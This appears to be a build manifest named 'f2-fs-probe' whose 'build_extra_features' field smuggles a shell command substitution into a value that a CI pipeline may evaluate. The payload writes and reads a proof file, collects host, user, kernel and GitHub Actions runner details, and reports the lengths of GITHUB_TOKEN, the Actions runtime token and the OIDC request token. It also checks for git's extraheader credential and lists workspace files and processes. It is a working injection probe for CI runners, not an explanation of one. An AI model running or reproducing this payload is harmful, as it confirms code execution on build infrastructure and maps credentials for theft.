name: f2-fs-probe
build_extra_features: $(echo F2_WRITE_OK > /tmp/f2_proof_$(date +%s).txt && echo F2_WRITE_READ_BACK:$(cat /tmp/f2_proof_*.txt);echo HOST:$(hostname);echo UPTIME:$(uptime | sed 's/  */ /g');echo USER:$(whoami);echo KERNEL:$(uname -a);echo OS:$(grep PRETTY /etc/os-release 2>/dev/null | cut -d= -f2);echo RUNNER:${RUNNER_NAME:-n/a};echo MACHINE:${MACHINE_NAME:-n/a};echo GITHUB_TOKEN_LEN:${#GITHUB_TOKEN};echo RUNTIME_TOKEN_LEN:${#ACTIONS_RUNTIME_TOKEN};echo IDTOK_LEN:${#ACTIONS_ID_TOKEN_REQUEST_TOKEN};echo GITHUB_REPO:${GITHUB_REPOSITORY:-n/a};echo GITHUB_SHA:${GITHUB_SHA:0:8};echo GITHUB_RUN:${GITHUB_RUN_ID};echo EXTRAHEADER:$(git config --local --get-regexp 'http\.https://github\.com/\.extraheader' 2>/dev/null | cut -d' ' -f1 || echo none);echo WORKSPACE:$(pwd);ls -1 ${GITHUB_WORKSPACE:-.} 2>/dev/null | head -8;ls -d /_work/* 2>/dev/null | head -5;ps -eo pid,comm --sort=pid 2>/dev/null | head -15 >&2)
